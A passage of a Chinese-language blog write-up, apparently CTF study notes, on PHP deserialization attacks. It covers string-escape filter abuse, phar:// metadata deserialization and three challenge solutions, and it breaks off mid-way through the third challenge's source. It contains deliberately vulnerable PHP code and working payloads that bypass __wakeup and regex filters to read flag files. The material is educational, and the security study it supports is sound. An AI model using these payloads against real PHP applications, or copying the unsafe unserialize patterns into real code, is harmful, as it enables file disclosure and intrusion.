class="line-numbers language-none"><code class="language-none">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>附：</p><p>验证payload是否正确</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";i:0;O:1:"A":1:&#123;s:8:"filename";S:8:"\66\6C\61\67\2E\70\68\70";&#125;&#125;'</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">a:2:&#123;i:0;s:325:&quot;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;Array(    [0] &#x3D;&gt; __PHP_Incomplete_Class Object        (            [__PHP_Incomplete_Class_Name] &#x3D;&gt; A            [filename] &#x3D;&gt; flag.php        ))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print(len('indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出：325</p><br><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>(不太懂phar反序列化怎么用，这部分摘自<a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a>)</p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>    <span class="token comment">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以明显的看到meta-data是以序列化的形式存储的：</p><p><img src="https://images.seebug.org/content/images/2018/08/ea55a494-3d8e-4bd9-9cae-e604194495b0.png-w331s"></p><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s"></p><ul><li>phar_test1.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phar://phar.phar/test.txt'</span><span class="token punctuation">;</span>    <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://images.seebug.org/content/images/2018/08/7497d95b-b33f-4de8-bc5e-03890aff1bd9.png-w331s"></p><p>其他函数当然也是可行的：</p><ul><li>phar_test2.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phar://phar.phar/a_random_string'</span><span class="token punctuation">;</span>    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//......</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。</p><br><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="unserialize1"><a href="#unserialize1" class="headerlink" title="unserialize1"></a>unserialize1</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">XianZhi</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造序列化代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">XianZhi</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XianZhi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//O:7:"XianZhi":1:&#123;s:4:"name";s:5:"/flag";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/07/30/anYHMt.png"></p><br><h3 id="unserialize2"><a href="#unserialize2" class="headerlink" title="unserialize2"></a>unserialize2</h3><p><strong>OC绕过、wake up绕过</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//the secret is in the f15g_1s_here.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里首先有两个要绕过的点</p><p>第一个点是<code>__wakeup()</code>，因为这里正常反序列化会写死<code>$this-&gt;ﬁle</code>属性为 index.php，但是php存在这么一个漏洞（CVE-2016-7124），当实际对象不等于反序列化的对象数时候会绕过<code>wakeup()</code>。</p><p>第二个点是正则匹配，这里的正则匹配的意思是如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式)就die掉，这里匹配的是<code>O:4</code>，直接使用+号当做空格即可绕过，即<code>O:+4</code>即可绕过。</p><p>构造序列化代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'f15g_1s_here.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:+4'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span>  <span class="token operator">=</span>  <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':1:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s1.ax1x.com/2020/07/30/anaal9.png"></p><br><h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p><strong>私有属性绕过</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" 